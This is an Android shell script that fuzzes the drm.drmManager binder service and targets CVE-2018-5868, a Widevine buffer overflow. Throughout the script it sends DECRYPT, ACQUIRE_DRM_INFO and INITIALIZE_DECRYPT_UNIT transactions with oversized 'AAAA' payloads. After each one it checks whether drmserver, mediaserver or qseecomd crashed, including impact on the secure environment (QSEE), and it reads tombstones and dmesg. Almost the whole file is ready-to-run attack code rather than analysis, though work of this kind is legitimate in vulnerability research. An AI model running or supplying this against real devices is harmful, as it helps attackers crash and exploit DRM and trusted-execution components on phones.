#!/system/bin/sh
# fuzz_drm.sh — Fuzz DRM binder service from shell
# Targets CVE-2018-5868 (Widevine buffer overflow via oversized input)
#
# Usage: sh /data/local/tmp/fuzz_drm.sh
# Monitor: dmesg | grep -iE 'qsee|widevine|oemcrypto|crash|oops'

# Helper: get PID by process name using ps (pidof is broken on this device)
getpid() {
    ps | grep "$1" | grep -v grep | head -1 | while read USER PID REST; do echo $PID; done
}

echo "=== DRM/Widevine Fuzzer ==="
echo "[*] Checking process PIDs..."
DRMPID=$(getpid drmserver)
echo "[+] drmserver PID: $DRMPID"
MSPID=$(getpid mediaserver)
echo "[+] mediaserver PID: $MSPID"
QSEEPID=$(getpid qseecomd)
echo "[+] qseecomd PID: $QSEEPID"

echo ""
echo "=== Phase 1: Confirm Widevine responds ==="

echo "[*] TX 1: ADD_UNIQUEID"
service call drm.drmManager 1

echo "[*] TX 7: GET_CONSTRAINTS (should show WVLastErrorKey)"
service call drm.drmManager 7

echo "[*] TX 13: GET_ORIGINAL_MIMETYPE (should show video/wvm)"
service call drm.drmManager 13

echo ""
echo "=== Phase 2: Attempt DRM session operations ==="

echo "[*] TX 11: ACQUIRE_DRM_INFO (Widevine registration request)"
echo "[*] Sending type=3 (REGISTRATION_INFO) for video/wvm..."
service call drm.drmManager 11 i32 0 i32 3 s16 "video/wvm" i32 0

echo ""
echo "[*] TX 26: OPEN_DECRYPT_SESSION_FROM_URI"
service call drm.drmManager 26 i32 0 s16 "file:///data/local/tmp/test.wvm" s16 "video/wvm"

echo ""
echo "=== Phase 3: Fuzz DECRYPT with oversized buffers ==="
echo "[*] Sending TX 28 (DECRYPT) with increasing payload sizes..."
echo "[*] Each i32 = 4 bytes of payload"

# 16 bytes (4 x i32)
echo "[*] DECRYPT: 16 bytes"
service call drm.drmManager 28 i32 0 i32 0 i32 4 i32 1094795585 i32 1094795585 i32 1094795585 i32 1094795585

DRMPID2=$(getpid drmserver)
if [ "$DRMPID2" != "$DRMPID" ]; then
    echo "[!!!] drmserver PID changed! $DRMPID -> $DRMPID2 (CRASH after 16B!)"
    DRMPID=$DRMPID2
fi

# 64 bytes (16 x i32) — inline, no loop needed
echo "[*] DECRYPT: 64 bytes"
service call drm.drmManager 28 i32 0 i32 0 i32 16 \
    i32 1094795585 i32 1094795585 i32 1094795585 i32 1094795585 \
    i32 1094795585 i32 1094795585 i32 1094795585 i32 1094795585 \
    i32 1094795585 i32 1094795585 i32 1094795585 i32 1094795585 \
    i32 1094795585 i32 1094795585 i32 1094795585 i32 1094795585

DRMPID2=$(getpid drmserver)
if [ "$DRMPID2" != "$DRMPID" ]; then
    echo "[!!!] drmserver PID changed! $DRMPID -> $DRMPID2 (CRASH after 64B!)"
    DRMPID=$DRMPID2
fi

# 128 bytes (32 x i32) — inline
echo "[*] DECRYPT: 128 bytes"
service call drm.drmManager 28 i32 0 i32 0 i32 32 \
    i32 1094795585 i32 1094795585 i32 1094795585 i32 1094795585 \
    i32 1094795585 i32 1094795585 i32 1094795585 i32 1094795585 \
    i32 1094795585 i32 1094795585 i32 1094795585 i32 1094795585 \
    i32 1094795585 i32 1094795585 i32 1094795585 i32 1094795585 \
    i32 1094795585 i32 1094795585 i32 1094795585 i32 1094795585 \
    i32 1094795585 i32 1094795585 i32 1094795585 i32 1094795585 \
    i32 1094795585 i32 1094795585 i32 1094795585 i32 1094795585 \
    i32 1094795585 i32 1094795585 i32 1094795585 i32 1094795585

DRMPID2=$(getpid drmserver)
if [ "$DRMPID2" != "$DRMPID" ]; then
    echo "[!!!] drmserver PID changed! $DRMPID -> $DRMPID2 (CRASH after 128B!)"
    DRMPID=$DRMPID2
fi

# 256 bytes (64 x i32) — inline
echo "[*] DECRYPT: 256 bytes"
service call drm.drmManager 28 i32 0 i32 0 i32 64 \
    i32 1094795585 i32 1094795585 i32 1094795585 i32 1094795585 \
    i32 1094795585 i32 1094795585 i32 1094795585 i32 1094795585 \
    i32 1094795585 i32 1094795585 i32 1094795585 i32 1094795585 \
    i32 1094795585 i32 1094795585 i32 1094795585 i32 1094795585 \
    i32 1094795585 i32 1094795585 i32 1094795585 i32 1094795585 \
    i32 1094795585 i32 1094795585 i32 1094795585 i32 1094795585 \
    i32 1094795585 i32 1094795585 i32 1094795585 i32 1094795585 \
    i32 1094795585 i32 1094795585 i32 1094795585 i32 1094795585 \
    i32 1094795585 i32 1094795585 i32 1094795585 i32 1094795585 \
    i32 1094795585 i32 1094795585 i32 1094795585 i32 1094795585 \
    i32 1094795585 i32 1094795585 i32 1094795585 i32 1094795585 \
    i32 1094795585 i32 1094795585 i32 1094795585 i32 1094795585 \
    i32 1094795585 i32 1094795585 i32 1094795585 i32 1094795585 \
    i32 1094795585 i32 1094795585 i32 1094795585 i32 1094795585 \
    i32 1094795585 i32 1094795585 i32 1094795585 i32 1094795585 \
    i32 1094795585 i32 1094795585 i32 1094795585 i32 1094795585

DRMPID2=$(getpid drmserver)
if [ "$DRMPID2" != "$DRMPID" ]; then
    echo "[!!!] drmserver PID changed! $DRMPID -> $DRMPID2 (CRASH after 256B!)"
    DRMPID=$DRMPID2
fi

# Also try ACQUIRE_DRM_INFO (TX 11) with oversized data — different code path
echo ""
echo "=== Phase 3b: Fuzz ACQUIRE_DRM_INFO (TX 11) ==="

echo "[*] TX 11: 128 bytes oversized registration data"
service call drm.drmManager 11 i32 0 i32 3 s16 "video/wvm" i32 8 \
    s16 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
    s16 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

DRMPID2=$(getpid drmserver)
if [ "$DRMPID2" != "$DRMPID" ]; then
    echo "[!!!] drmserver PID changed! $DRMPID -> $DRMPID2 (CRASH after TX11 fuzz!)"
    DRMPID=$DRMPID2
fi

# Try INITIALIZE_DECRYPT_UNIT (TX 29) — another QSEE path
echo ""
echo "=== Phase 3c: Fuzz INITIALIZE_DECRYPT_UNIT (TX 29) ==="

echo "[*] TX 29: with oversized header"
service call drm.drmManager 29 i32 0 i32 0 i32 32 \
    i32 1094795585 i32 1094795585 i32 1094795585 i32 1094795585 \
    i32 1094795585 i32 1094795585 i32 1094795585 i32 1094795585 \
    i32 1094795585 i32 1094795585 i32 1094795585 i32 1094795585 \
    i32 1094795585 i32 1094795585 i32 1094795585 i32 1094795585 \
    i32 1094795585 i32 1094795585 i32 1094795585 i32 1094795585 \
    i32 1094795585 i32 1094795585 i32 1094795585 i32 1094795585 \
    i32 1094795585 i32 1094795585 i32 1094795585 i32 1094795585 \
    i32 1094795585 i32 1094795585 i32 1094795585 i32 1094795585

DRMPID2=$(getpid drmserver)
if [ "$DRMPID2" != "$DRMPID" ]; then
    echo "[!!!] drmserver PID changed! $DRMPID -> $DRMPID2 (CRASH after TX29 fuzz!)"
    DRMPID=$DRMPID2
fi

echo ""
echo "=== Phase 4: Check for crashes ==="
DRMPID_FINAL=$(getpid drmserver)
MSPID_FINAL=$(getpid mediaserver)
QSEEPID_FINAL=$(getpid qseecomd)

echo "drmserver:   $DRMPID -> $DRMPID_FINAL"
echo "mediaserver: $MSPID -> $MSPID_FINAL"
echo "qseecomd:    $QSEEPID -> $QSEEPID_FINAL"

if [ "$DRMPID" != "$DRMPID_FINAL" ]; then
    echo "[!!!] drmserver CRASHED AND RESTARTED"
fi
if [ "$MSPID" != "$MSPID_FINAL" ]; then
    echo "[!!!] mediaserver CRASHED AND RESTARTED"
fi
if [ "$QSEEPID" != "$QSEEPID_FINAL" ]; then
    echo "[!!!] qseecomd CRASHED AND RESTARTED — QSEE IMPACT!"
fi

echo ""
echo "[*] Checking tombstones..."
ls -lt /data/tombstones/ 2>/dev/null | head -5

echo ""
echo "[*] Checking dmesg for crash/QSEE messages (last 20 lines)..."
dmesg | grep -iE 'qsee|widevine|oemcrypto|crash|oops|panic|segfault|tombstone' | tail -20

echo ""
echo "=== Done ==="
